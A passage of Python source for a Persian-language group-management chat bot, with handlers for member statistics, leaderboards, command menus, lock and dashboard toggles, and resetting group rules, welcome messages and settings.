        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        mess = MPro('روی پیام پاک شده ریپلای زدی.' + OBJM['INFOOBJECT']['types']['ok'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                mess = 'گویدش : ``' + user_guid + '``'
        return mess

    def send_your_info(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        mess = MPro(f"روی پیام پاک شده ریپلای زدی. {OBJM['INFOOBJECT']['types']['ok']}", 2)
        if message_info:
            mess = MPro(f"کاربر شناسایی نشد. {OBJM['INFOOBJECT']['types']['ok']}", 2)
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                rank = formrank(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, user_guid)
                mess = MPro(f'مقام 〔 {rank} 〕', 4)
                if user_guid not in USERS[OBJM['object_guid']]:
                    getInfoUser(OBJM['object_guid'], user_guid)
                mess += formInfo(USERS[OBJM['object_guid']][user_guid], OBJM, user_guid)
        return mess

    def send_your_count_messages(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        mess = MPro('روی پیام پاک شده ریپلای زدی.' + OBJM['INFOOBJECT']['types']['ok'])
        if not message_info:
            mess = MPro('کاربر شناسایی نشد.' + OBJM['INFOOBJECT']['types']['ok'])
        user_guid = GetReplyGuid(message_info)
        if not user_guid:
            return mess
        if user_guid not in USERS[OBJM['object_guid']]:
            getInfoUser(OBJM['object_guid'], user_guid)
        countms = USERS[OBJM['object_guid']][user_guid][0]
        mess = MPro('تعداد پیامش : ' + str(countms))
        return mess

    def send_your_count_warnings(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        mess = MPro('روی پیام پاک شده ریپلای زدی.' + OBJM['INFOOBJECT']['types']['ok'])
        if not message_info:
            mess = MPro('کاربر شناسایی نشد.' + OBJM['INFOOBJECT']['types']['ok'])
        user_guid = GetReplyGuid(message_info)
        if not user_guid:
            return mess
        if user_guid not in USERS[OBJM['object_guid']]:
            getInfoUser(OBJM['object_guid'], user_guid)
        countwr = USERS[OBJM['object_guid']][user_guid][1]
        mess = MPro('تعداد اخطارش : ' + str(countwr))
        return mess

    def message_length(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            length = len(message_info['text'])
            return MPro('طول پیام : ' + str(length))
        return MPro('روی پیام پاک شده ریپلای زدی.' + OBJM['INFOOBJECT']['types']['ok'])

    def message_infos(OBJM):
        message = client.get_messages_by_id(OBJM['object_guid'], OBJM['is_reply_message'])
        return json.dumps(message)

    def install_pro_libs(OBJM):
        client.send_text(OBJM['object_guid'], MPro(f" در حال نصب لایب ها... {OBJM['INFOOBJECT']['types']['ok']}", 2), OBJM['message_id'])
        install_auto(['jdatetime', 'Pillow', 'moviepy'])
        try:
            import jdatetime
        except ImportError:
            import datetime as jdatetime
        return MPro(f"{OBJM['INFOOBJECT']['types']['ok']} لایب ها نصب شد. ", 2)

    def make_voice_call(OBJM):
        mess = MPro(f" ویسکال ایجاد شد. {OBJM['INFOOBJECT']['types']['ok']}", 2)
        result = client.create_voice_chat(OBJM['object_guid'])
        try:
            if result['status'] == 'VoiceChatExist':
                mess = MPro(f" ویسکال ایجاد شده است. {OBJM['INFOOBJECT']['types']['ok']}", 4)
                mess += MPro(f"عنوان : {result['exist_group_voice_chat']['title']}")
                mess += MPro(f"تعداد افراد : {result['exist_group_voice_chat']['participant_count']}")
            else:
                INFOS[OBJM['INFOOBJECT']['object_guid']]['voice_call'] += 1
                return mess
        except Exception as e:
            print(e)
            mess = MPro(f" کال ایجاد نشد. {OBJM['INFOOBJECT']['types']['ok']}", 2)
        return mess

    def send_full_info_me(OBJM):
        rank = formrank(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, OBJM['guid_sender'])
        mess = MPro(f'مقام 〔 {rank} 〕', 4)
        user = client.get_chat_info(OBJM['guid_sender'])['user']
        mess += manage_info(user)
        if OBJM['guid_sender'] not in USERS[OBJM['object_guid']]:
            getInfoUser(OBJM['object_guid'], OBJM['guid_sender'])
        mess += formInfo(USERS[OBJM['object_guid']][OBJM['guid_sender']], OBJM, OBJM['guid_sender'])
        mess += '\n' + MPro(OBJM['guid_sender']) + '\n─┅━━━━━━━┅─'
        if 'bio' in user:
            mess += f"\n\n{user['bio']}"
        return mess

    def send_setting_commands(OBJM):
        mess = MPro(' تنظیم 〔 💎 〕')
        list_texts = Sorting(['تنظیم فونت', 'تنظیم شکل', 'تنظیم خوشامدگویی', 'تنظیم خدافظی', 'تنظیم قوانین', 'تنظیم بنر'])
        for text in list_texts:
            mess += MPro(text)
        return mess

    def send_status_commands(OBJM):
        mess = MPro(' امار 〔 📌 〕')
        list_texts = Sorting(['امار گپ', 'وضعیت گپ', 'گزارشات', 'محدودیت', 'امار اعضا', 'امار کل'])
        for text in list_texts:
            mess += MPro(text)
        return mess

    def send_reset_commands(OBJM):
        list_texts = Sorting(['ریست دستورات', 'ریست قفل', 'ریست داشبورد', 'ریست قوانین', 'ریست خدافظی', 'ریست خوشامدگویی', 'ریست بنر', 'ریست کلید', 'ریست گپ', 'ریست شکل', 'ریست فونت', 'ریست علامت', 'ریست تنظیمات'])
        mess = MPro(' ریست 〔 👾 〕')
        for text in list_texts:
            mess += MPro(text)
        return mess

    def send_games_commands(OBJM):
        mess = MPro(' سرگرمی 〔 ⚡ 〕')
        list_texts = Sorting(['چالش', 'جوک', 'بیو', 'فال', 'فکت', 'اعتراف', 'دانستنی', 'گنگ', 'ذکر', 'انگیزشی', 'فتوگرافی', 'پ ن پ', 'پروفایل', 'والپیپر', 'فال حافظ', 'حق', 'دقت', 'تکست', 'تاس', 'سکه', 'عدد شانسی'])
        for text in list_texts:
            mess += MPro(text)
        return mess

    def send_panel_setting(OBJM):
        mess = MPro(' تنظیمات 〔 💠 〕')
        list_texts = Sorting(['داشبورد', 'امار', 'سرگرمی', 'هوش مصنوعی', 'تنظیم', 'ریست', 'دستورات'])
        for text in list_texts:
            mess += MPro(text)
        return mess

    def send_reports_gap(OBJM):
        mess = MPro('گزارشات 〔 📊 〕', 4)
        empty = True
        reports = OBJM['INFOOBJECT']['type_messages']
        for report in reports:
            empty = False
            mess += MPro(f'{report} : {reports[report]}')
        if empty:
            mess += MPro('هیچ دیتایی شناسایی نشده است.')
        return mess

    def send_dashboard(OBJM):
        mess = MPro('داشبورد 〔 🛠️ 〕', 4) + MPro(f'زمان : {Date()}\n')
        for lock in Listset:
            res = ''
            if int(OBJM['SETTING_KEYS'][Listset[lock]]) == 0:
                res = '〔 خاموش 〕'
            mess += MPro(f'{lock} {res}')
        mess += '\n'
        mess += MPro('تعداد اخطار : ' + str(OBJM['INFOOBJECT']['warnning']))
        return mess

    def send_list_lists(OBJM):
        mess = MPro('لیست ها 〔 📑 〕', 4)
        list_texts = Sorting(['لیست دستورات', 'لیست قفل', 'لیست ویژه', 'لیست ادمین', 'لیست سکوت', 'لیست معاف', 'لیست فیلتر', 'لیست کلمات', 'لیست عضویت', 'لیست یادداشت', 'لیست کیل', 'لیست کلید', 'لیست متادیتا'])
        for text in list_texts:
            mess += MPro(text, 1)
        return mess

    def send_status_gap(OBJM):
        mess = MPro(f"امار گروه 〔 {str(OBJM['INFOOBJECT']['name'])} 〕", 4)

        def myFunc(e):
            return e['mes']
        listMems = []
        allMes = 0
        list_users = USERS[OBJM['object_guid']]
        for mems in list_users:
            allMes += int(list_users[mems][0])
            listMems.append({'mes': int(list_users[mems][0]), 'name': str(list_users[mems][2]), 'guid': str(mems)})
        now = f'{Date()} {Hour()}'
        time_oj = jdatetime.datetime.fromtimestamp(int(OBJM['INFOOBJECT']['date']))
        mess += MPro(f"شروع فعایت : {str(time_oj)}")
        mess += MPro(f"زمان : {str(now)}\n")
        mess += MPro(f"تعداد کل پیام ثبت شده : {str(OBJM['INFOOBJECT']['messages'])}")
        mess += MPro(f"تعداد کل پیام مجاز : {str(allMes)}")
        mess += MPro(f"تعداد جوین شده : {str(OBJM['INFOOBJECT']['join'])}")
        mess += MPro(f"تعداد افزوده شده : {str(OBJM['INFOOBJECT']['add'])}")
        mess += MPro(f"تعداد لفت داده : {str(OBJM['INFOOBJECT']['left'])}")
        mess += MPro(f"تعداد بن شده : {str(OBJM['INFOOBJECT']['ban'])}")
        mess += MPro(f"تعداد ویسکال : {str(OBJM['INFOOBJECT']['voice_call'])}\n")
        mess += 'به ترتیب تعداد پیام ها  ━━━━━━━━┅─\n\n'
        listMems.sort(reverse=True, key=myFunc)
        limit = 1
        cups = {1: '🥇', 2: '🥈', 3: '🥉'}
        for member in listMems:
            if limit > 20:
                break
            rank = formrank(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, member['guid'], True)
            countms = member['mes']
            nickname = member['name']
            guid = member['guid']
            if nickname == 'بدون لقب' or nickname == 'اراذل':
                getInfoUser(OBJM['object_guid'], guid, list_users[guid][3])
                nickname = list_users[guid][2]
            if rank and len(rank) > 0:
                rank = f' - {rank}'
            if limit in cups:
                mess += f"{str(limit)}.کاربر {nickname} با {str(countms)}{rank} - {cups[limit]}\n"
            else:
                mess += f"{str(limit)}.کاربر {nickname} با {str(countms)}{rank}\n"
            limit += 1
        return mess

    def send_all_gap_status(OBJM):
        mess = MPro(f"وضعیت گروه 〔 {str(OBJM['INFOOBJECT']['name'])} 〕", 4)

        def myFunc(e):
            return e['mes']
        listMems = []
        allMes = 0
        list_users = USERS[OBJM['object_guid']]
        for mems in list_users:
            allMes += int(list_users[mems][0])
            listMems.append({'mes': int(list_users[mems][0]), 'name': str(list_users[mems][2]), 'guid': str(mems)})
        listMems.sort(reverse=True, key=myFunc)
        count_full_admins, count_admins, count_members, limit = (0, 0, 0, 1)
        count_all = len(listMems)
        for member in listMems:
            rank = validatUser(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, member['guid'])
            if rank == 2:
                count_full_admins += 1
            elif rank == 1:
                count_admins += 1
            count_members += 1
            limit += 1
        now = f'{Date()} {Hour()}'
        time_oj = jdatetime.datetime.fromtimestamp(int(OBJM['INFOOBJECT']['date']))
        time_pass_activity = get_iran_timestamp() - int(OBJM['INFOOBJECT']['date'])
        mess += MPro(f'شروع فعایت : {str(time_oj)}')
        mess += MPro(f'زمان : {str(now)}')
        mess += MPro(send_timeout_group(OBJM, True))
        mess += MPro(f'مدت زمان فعالیت : {Time_pass(time_pass_activity)}')
        mess += '\n'
        mess += MPro(f"تعداد کل پیام ثبت شده : {str(OBJM['INFOOBJECT']['messages'])}")
        mess += MPro(f"تعداد کل پیام مجاز : {str(allMes)}")
        mess += MPro(f"تعداد جوین شده : {str(OBJM['INFOOBJECT']['join'])}")
        mess += MPro(f"تعداد افزوده شده : {str(OBJM['INFOOBJECT']['add'])}")
        mess += MPro(f"تعداد لفت داده : {str(OBJM['INFOOBJECT']['left'])}")
        mess += MPro(f"تعداد بن شده : {str(OBJM['INFOOBJECT']['ban'])}")
        mess += MPro(f"تعداد ویسکال : {str(OBJM['INFOOBJECT']['voice_call'])}\n")
        mess += MPro(f'تعداد کاربران ویژه : {str(count_full_admins)}')
        mess += MPro(f'تعداد ادمین ها : {str(count_admins)}')
        mess += MPro(f'تعداد کاربران فعال : {str(count_members)}')
        mess += '\n'
        mess += 'برترین افراد ━━━━━━━━┅─\n\n'
        limit = 1
        cups = {1: '🥇', 2: '🥈', 3: '🥉'}
        for member in listMems:
            if limit > 3:
                break
            rank = formrank(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, member['guid'], True)
            countms = member['mes']
            nickname = member['name']
            guid = member['guid']
            if nickname == 'بدون لقب' or nickname == 'اراذل':
                getInfoUser(OBJM['object_guid'], guid, list_users[guid][3])
                nickname = list_users[guid][2]
            if rank and len(rank) > 0:
                rank = f' - {rank}'
            if limit in cups:
                mess += f'{str(limit)}.کاربر {nickname} با {str(countms)}{rank} - {cups[limit]}\n'
            else:
                mess += f'{str(limit)}.کاربر {nickname} با {str(countms)}{rank}\n'
            limit += 1
        return mess

    def send_status_users(OBJM):
        mess = MPro(f"امار اعضا 〔 {str(OBJM['INFOOBJECT']['name'])} 〕", 4)

        def myFunc(e):
            return e['mes']
        listMems = []
        allMes = 0
        list_users = USERS[OBJM['object_guid']]
        for mems in list_users:
            allMes += int(list_users[mems][0])
            listMems.append({'mes': int(list_users[mems][0]), 'name': str(list_users[mems][2]), 'guid': str(mems)})
        mess += MPro(f"تعداد کل پیام ثبت شده : {str(OBJM['INFOOBJECT']['messages'])}")
        mess += MPro(f'تعداد کل پیام مجاز : {str(allMes)}\n')
        mess += 'به ترتیب تعداد پیام ها  ━━━━━━━━┅─\n\n'
        listMems.sort(reverse=True, key=myFunc)
        limit = 1
        cups = {1: '🥇', 2: '🥈', 3: '🥉'}
        for member in listMems:
            if limit > 100:
                break
            rank = formrank(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, member['guid'], True)
            countms = member['mes']
            nickname = member['name']
            guid = member['guid']
            if nickname == 'بدون لقب' or nickname == 'اراذل':
                getInfoUser(OBJM['object_guid'], guid, list_users[guid][3])
                time.sleep(0.5)
                nickname = list_users[guid][2]
            if rank and len(rank) > 0:
                rank = f' - {rank}'
            if limit in cups:
                mess += f'{str(limit)}.کاربر {nickname} با {str(countms)}{rank} - {cups[limit]}\n'
            else:
                mess += f'{str(limit)}.کاربر {nickname} با {str(countms)}{rank}\n'
            limit += 1
        return mess

    def send_status_all(OBJM):
        mess = MPro('امار کل 〔 ' + str(OBJM['INFOOBJECT']['name']) + ' 〕', 4)

        def myFunc(e):
            return e['mes']
        allMes = 0
        listMems = []
        list_users = USERS[OBJM['object_guid']]
        for mems in list_users:
            allMes += int(list_users[mems][0])
            listMems.append({'mes': int(list_users[mems][0]), 'name': str(list_users[mems][2]), 'guid': str(mems)})
        mess += f"تعداد کل پیام ثبت شده : {str(OBJM['INFOOBJECT']['messages'])}"
        mess += f'تعداد کل پیام مجاز : {str(allMes)}'
        listMems.sort(key=myFunc, reverse=True)
        count_full_admins = 0
        count_admins = 0
        count_members = 0
        limit = 1
        manage_list = ''
        count_all = len(listMems)
        for member in listMems:
            rank = validatUser(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, member['guid'])
            if rank == 4:
                rank = 'سازنده 💀\u200d👑\u200d'
            elif rank == 3:
                rank = 'مالک \u200d👑\u200d'
            elif rank == 2:
                rank = 'ادمین ویژه ⭐'
                count_full_admins += 1
            elif rank == 1:
                rank = 'ادمین ✨'
                count_admins += 1
            else:
                rank = ''
            count_members += 1
            countms = member['mes']
            nickname = member['name']
            if rank:
                rank_str = f' - {rank}'
            else:
                rank_str = ''
            manage_list += f'.کاربر {nickname} با {countms}{rank_str}\n'
        mess += MPro('تعداد کاربران ویژه : ' + str(count_full_admins))
        mess += MPro('تعداد ادمین ها : ' + str(count_admins))
        mess += MPro('تعداد کاربران : ' + str(count_members))
        mess += MPro('تعداد کل : ' + str(count_all))
        caption = MPro('تعداد کاربران ویژه : ' + str(count_full_admins))
        caption += MPro('تعداد ادمین ها : ' + str(count_admins))
        caption += MPro('تعداد کاربران : ' + str(count_members))
        caption += MPro('تعداد کل : ' + str(count_all))
        mess += '\nتعداد پیام ها  ━━━━━━━━┅─\n\n'
        mess += manage_list
        listMembers = 'listMembers.txt'
        with open(listMembers, 'w', encoding='utf-8') as file:
            file.write(mess)
        try:
            client.send_file(OBJM['object_guid'], listMembers, OBJM['message_id'], caption)
        except Exception as e:
            return None

    def arange_list_words(OBJM=None):

        def myFunc(e):
            return len(e)
        for TIP in SPEAKX:
            SPEAK = SPEAKX[TIP]
            listManage = []
            for key in SPEAK:
                listManage.append(key)
            listManage.sort(reverse=True, key=myFunc)
            NSPEAK = {}
            for newkey in listManage:
                NSPEAK[newkey] = SPEAK[newkey]
            SPEAKX[TIP] = NSPEAK
        UPFILES(file_speakx, SPEAKX)
        if OBJM:
            return MPro('جملات ربات مرتب سازی شد. ' + OBJM['INFOOBJECT']['types']['ok'], 2)
        return None

    def remove_banner_gap(OBJM):
        mess = OBJM['INFOOBJECT']['baner']
        if len(mess) == 0:
            mess = MPro(f" بنری ثبت نشده است. {OBJM['INFOOBJECT']['types']['ok']}", 2)
        else:
            mess = MPro(f" بنر حذف شد. {OBJM['INFOOBJECT']['types']['ok']}", 2)
        INFOS[OBJM['object_guid']]['baner'] = ''
        return mess

    def send_ai_commands(object_guid=None, guid_sender=None):
        mess = MPro('هوش مصنوعی 💎', 4)
        list_texts = Sorting(['پرسش سوال', 'ساخت عکس', 'ساخت لوگو', 'تبدیل متن به ویس', 'تبدیل متن به عکس'])
        for text in list_texts:
            mess += MPro(text, 1)
        return mess

    def reset_timer_commands(OBJM):
        INFOS[OBJM['object_guid']]['AUTOS'] = []
        mess = MPro(f" لیست تایمر پاکسازی شد. {OBJM['INFOOBJECT']['types']['ok']}", 2)
        return mess

    def optimizing_source(OBJM):
        object_guid = OBJM['object_guid']
        nums = 10
        deleting = []
        Alls = 0
        User = 0
        for user_guid in USERS[object_guid]:
            try:
                if user_guid != GUIDME:
                    user = USERS[object_guid][user_guid]
                    mes = user[0]
                    state = mes
                    if state <= nums:
                        Alls += mes
                        User += 1
                        deleting.append(user_guid)
                    else:
                        continue
            except Exception as e:
                print(e)
                continue
        for user_guid in deleting:
            del USERS[object_guid][user_guid]
        try:
            with open(file_users, 'w') as outfile:
                json.dump(USERS, outfile)
        except Exception as e:
            print(e)
        JoindUsers[object_guid] = []
        return MPro('کاربران با تعداد پیام کمتر از ' + str(nums) + ' از حافظه پاک شد. ' + ST['ok'] + '\nدر مجموع ' + str(Alls) + ' پیام و ' + str(User) + ' کاربر پاک شده است.' + ST['ok'], 2)

    def reset_locks(OBJM):
        isok = True
        if OBJM['TIP'] <= 3:
            if OBJM['SETTING_KEYS'][18] == 0:
                isok = False
        if isok:
            INFOS[OBJM['object_guid']]['locks'] = '11111111111111111111111111111111111'
            return MPro('قفل ریست شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        else:
            return MPro('دسترسی ندارید. ' + OBJM['INFOOBJECT']['types']['ok'])

    def close_all_looks(OBJM):
        isok = True
        if OBJM['TIP'] <= 3:
            if OBJM['SETTING_KEYS'][18] == 0:
                isok = False
        if isok:
            INFOS[OBJM['object_guid']]['locks'] = '00000000000000000000000000000000000'
            return MPro('قفل ها بسته شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        else:
            return MPro('دسترسی ندارید. ' + OBJM['INFOOBJECT']['types']['ok'])

    def open_all_looks(OBJM):
        isok = True
        if OBJM['TIP'] <= 3:
            if OBJM['SETTING_KEYS'][18] == 0:
                isok = False
        if isok:
            INFOS[OBJM['object_guid']]['locks'] = '11111111111111111111111111111111111'
            return MPro('قفل ها باز شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        else:
            return MPro('دسترسی ندارید. ' + OBJM['INFOOBJECT']['types']['ok'])

    def reset_commands(OBJM):
        isok = True
        if OBJM['TIP'] <= 3:
            if OBJM['SETTING_KEYS'][17] == 0:
                isok = False
        if isok:
            INFOS[OBJM['object_guid']]['keys'] = '111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'
            return MPro('دستورات ریست شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        else:
            return MPro('دسترسی ندارید. ' + OBJM['INFOOBJECT']['types']['ok'])

    def open_all_commands(OBJM):
        isok = True
        if OBJM['TIP'] <= 3:
            if OBJM['SETTING_KEYS'][17] == 0:
                isok = False
        if isok:
            INFOS[OBJM['object_guid']]['keys'] = '111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'
            return MPro('دستورات باز شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        else:
            return MPro('دسترسی ندارید. ' + OBJM['INFOOBJECT']['types']['ok'])

    def close_all_commands(OBJM):
        isok = True
        if OBJM['TIP'] <= 3:
            if OBJM['SETTING_KEYS'][17] == 0:
                isok = False
        if isok:
            INFOS[OBJM['object_guid']]['keys'] = '000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
            return MPro('دستورات بسته شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        else:
            return MPro('دسترسی ندارید. ' + OBJM['INFOOBJECT']['types']['ok'])

    def reset_rules(OBJM):
        rules_text = '📜 قوانین گپ 〔 #اسم_گروه 〕 به شرح زیر میباشد.\n\n» احترام به کاربران\n» احترام به عقاید و فرهنگ ها\n» ارسال نکردن تبلیغات\n» ممبر دزدی نکردن\n» اسپم و محتوای نامناسب ارسال نکردن'
        INFOS[OBJM['object_guid']]['rols'] = rules_text
        response_message = MPro(f"قوانین ریست شد. {INFOS[OBJM['object_guid']]['types']['ok']}")
        return response_message

    def reset_main_keys(OBJM):
        main_keys = ['ربات']
        INFOS[OBJM['object_guid']]['main_keys'] = main_keys
        response_message = MPro(f"کلید ریست شد. {INFOS[OBJM['object_guid']]['types']['ok']}")
        return response_message

    def reset_media_bye(OBJM):
        bye_symbol = '🤲'
        INFOS[OBJM['object_guid']]['bye'] = bye_symbol
        response_message = MPro(f"خدافظی ریست شد. {INFOS[OBJM['object_guid']]['types']['ok']}")
        return response_message

    def reset_media_welcome(OBJM):
        welcome_message = '+ به گپ 〔 #اسم_گروه 〕 خوش آمدی عزیزم 💎✨\n- بمونی برامون +×)\n\n⏰ - » #زمان\n📆 - » #تاریخ'
        INFOS[OBJM['object_guid']]['welcome'] = welcome_message
        response_message = MPro(f"خوشامدگویی ریست شد. {INFOS[OBJM['object_guid']]['types']['ok']}")
        return response_message

    def reset_banner(OBJM):
        banner_text = ''
        INFOS[OBJM['object_guid']]['banner'] = banner_text
        response_message = MPro(f"بنر ریست شد. {INFOS[OBJM['object_guid']]['types']['ok']}")
        return response_message

    def reset_symbol(OBJM):
        symbol = default_ok
        INFOS[OBJM['object_guid']]['types']['ok'] = symbol
        response_message = MPro(f"علامت ریست شد. {INFOS[OBJM['object_guid']]['types']['ok']}")
        return response_message

    def reset_font_text(OBJM):
        font_type = 'natual'
        INFOS[OBJM['object_guid']]['types']['font'] = font_type
        response_message = MPro(f"قفل ریست شد. {INFOS[OBJM['object_guid']]['types']['ok']}")
        return response_message

    def reset_shape_text(OBJM):
        shape_type = 'natual'
        INFOS[OBJM['object_guid']]['types']['type'] = shape_type
        response_message = MPro(f"شکل ریست شد. {INFOS[OBJM['object_guid']]['types']['ok']}")
        return response_message

    def reset_dashboard(OBJM):
        isok = True
        if OBJM['TIP'] <= 3:
            if int(OBJM['SETTING_KEYS'][16]) == 0:
                isok = False
        if isok:
            INFOS[OBJM['object_guid']]['setting'] = '11111111111111111111111111111111111'
            return MPro('داشبورد ریست شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('دسترسی ندارید. ' + OBJM['INFOOBJECT']['types']['ok'])

    def open_dashboard(OBJM):
        isok = True
        if OBJM['TIP'] <= 3:
            if int(OBJM['SETTING_KEYS'][16]) == 0:
                isok = False
        if isok:
            INFOS[OBJM['object_guid']]['setting'] = '11111111111111111111111111111111111'
            return MPro('داشبورد باز شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('دسترسی ندارید. ' + OBJM['INFOOBJECT']['types']['ok'])

    def close_dashboard(OBJM):
        isok = True
        if OBJM['TIP'] <= 3:
            if int(OBJM['SETTING_KEYS'][16]) == 0:
                isok = False
        if isok:
            INFOS[OBJM['object_guid']]['setting'] = '00000000000000000000000000000000000'
            return MPro('داشبورد بسته شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('دسترسی ندارید. ' + OBJM['INFOOBJECT']['types']['ok'])

    def reset_setting(OBJM):
        try:
            group_title = client.get_chat_info(OBJM['object_guid'])['group']['group_title']
            INFOS[OBJM['object_guid']]['name'] = group_title
        except Exception:
            pass
        INFOS[OBJM['object_guid']]['welcome'] = '+ به گپ 〔 #اسم_گروه 〕 خوش آمدی عزیزم 💎✨\n- بمونی برامون +×)\n\n⏰ - » #زمان\n📆 - » #تاریخ'
        INFOS[OBJM['object_guid']]['bye'] = '🤲'
        INFOS[OBJM['object_guid']]['rols'] = '📜 قوانین گپ 〔 #اسم_گروه 〕 به شرح زیر میباشد.\n\n» احترام به کاربران\n» احترام به عقاید و فرهنگ ها\n» ارسال نکردن تبلیغات\n» ممبر دزدی نکردن\n» اسپم و محتوای نامناسب ارسال نکردن'
        INFOS[OBJM['object_guid']]['setting'] = '11111111111111111111111111111111111'
        INFOS[OBJM['object_guid']]['keys'] = '111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'
        INFOS[OBJM['object_guid']]['locks'] = '11111111111111111111111111111111111'
        INFOS[OBJM['object_guid']]['types']['ok'] = default_ok
        INFOS[OBJM['object_guid']]['types']['font'] = 'natual'
        INFOS[OBJM['object_guid']]['types']['type'] = 'natual'
        message = 'تنظیمات ریست شد. '
        info_object = OBJM['INFOOBJECT']
        ok_message = info_object['types']['ok']
        final_message = MPro(f'{message}{ok_message}')
        return final_message

    def send_list_fulladmins(OBJM):
        mess = MPro('لیست ویژه 〔 ⭐ 〕', 4)
        empty = True
        for prs in OBJM['INFOOBJECT']['full_admins']:
            mess += MPro('کاربر ' + OBJM['INFOOBJECT']['full_admins'][prs], 3)
            empty = False
        if empty:
            mess += MPro('لیست مدیران ویژه خالی میباشد.', 3)
        return mess

    def send_list_silents(OBJM):
        mess = MPro('لیست سکوت 〔 🔕 〕', 4)
        empty = True
        for prs in OBJM['INFOOBJECT']['silent_list']:
            mess += MPro('کاربر ' + OBJM['INFOOBJECT']['silent_list'][prs], 3)
            empty = False
        if empty:
            mess += MPro('لیست سکوت خالی میباشد.', 3)
        return mess

    def send_list_exempts(OBJM):
        mess = MPro('لیست معاف 〔 ❇️ 〕', 4)
        empty = True
        for prs in OBJM['INFOOBJECT']['exempt_list']:
            mess += MPro('کاربر ' + OBJM['INFOOBJECT']['exempt_list'][prs], 3)
            empty = False
        if empty:
            mess += MPro('لیست معاف خالی میباشد.', 3)
        return mess

    def send_list_kills(OBJM):
        mess = MPro('لیست کیل 〔 ☠️ 〕', 4)
        empty = True
        for prs in OBJM['INFOOBJECT']['black_list']:
            state = OBJM['INFOOBJECT']['black_list'][prs][1]
            name = OBJM['INFOOBJECT']['black_list'][prs][0]
            if state == 1:
                state = '🫀'
            else:
                state = '💀'
            mess += MPro('کاربر ' + name + ' - ' + state, 3)
            empty = False
        if empty:
            mess += MPro('لیست کیل خالی میباشد.', 3)
        return mess

    def send_list_filters(OBJM):
        mess = MPro('لیست فیلتر 〔 📛 〕', 4)
        empty = True
        for word in OBJM['INFOOBJECT']['filterlist']:
            word = Font_filter(word)
            mess += MPro('کلمه ' + word, 3)
            empty = False
        if empty:
            mess += MPro('لیست فیلتر خالی میباشد.', 3)
        return mess

    def send_list_metadata(OBJM):
        mess = MPro('لیست متادیتا 〔 ❤️\u200d🔥 〕', 4)
        mess += MPro('۱&متن تکی&۱')
        mess += MPro('۲&متن برجسته&۲')
        mess += MPro('۳&متن کج شده&۳')
        mess += MPro('۴&متن خط خورده&۴')
        mess += MPro('۵&متن زیر خط&۵')
        mess += MPro('۶&متن لینک دار&۶(لینک یا گوید)')
        mess += MPro('۷&متن اسپویلر&۷')
        return mess

    def send_list_keys(OBJM):
        mess = MPro('لیست کلید 〔 🔑 〕', 4)
        empty = True
        for word in OBJM['INFOOBJECT']['main_keys']:
            mess += MPro('کلمه ' + word, 3)
            empty = False
        if empty:
            mess += MPro('لیست کلید خالی میباشد.', 3)
        return mess

    def send_list_admins(OBJM):
        mess = MPro('لیست ادمین 〔 ✨ 〕', 4)
        empty = True
        for prs in OBJM['INFOOBJECT']['admins']:
            mess += MPro('کاربر ' + OBJM['INFOOBJECT']['admins'][prs], 3)
            empty = False
        if empty:
            mess += MPro('لیست ادمین ها خالی میباشد.', 3)
        return mess

    def send_list_locks(OBJM):
        mess = MPro('لیست قفل 〔 🔓 \u200d〕', 4)
        locks_warning = OBJM['INFOOBJECT']['locks_warning']
        locks_warning_show = OBJM['INFOOBJECT']['locks_warning_show']
        locks_ban = OBJM['INFOOBJECT']['locks_ban']
        for lock in Listlocks:
            res = ''
            key = Listlocks[lock]
            if int(OBJM['LOCKS_KEYS'][key]) == 0:
                ison, isshow = ('', '')
                ison = '🟢' if str(locks_ban[key]) == '0' else ''
                isshow = '🔇' if str(locks_warning_show[key]) == '0' else ''
                res = f'〔 {locks_warning[key]} 〕 {ison} {isshow}'
            mess += MPro(f'{lock} {res}', 3)
        return mess

    def send_list_joining(OBJM):
        mess = MPro('لیست عضویت 〔 ⚜️ 〕', 4)
        channels = OBJM['INFOOBJECT']['channels']
        if len(channels) == 0:
            mess += MPro('لیست عضویت خالی میباشد.', 3)
        else:
            for channel in channels:
                mess += MPro(channel, 3)
        return mess

    def send_list_notes(OBJM):
        mess = MPro('لیست یادداشت 〔 💬 〕 ')
        year, month, week, day, hour = (Year(), Month(), Week(), Day(), Hour())
        mess += MPro(f'تاریخ : {hour} ⌯ {week} ⌯ {year}-{month}-{day}')
        mess += '\n─┅━━━━━━━┅─\n'
        reminders = OBJM['INFOOBJECT']['remmember']
        if len(reminders) == 0:
            mess += MPro('لیست یادداشت خالی میباشد.', 3)
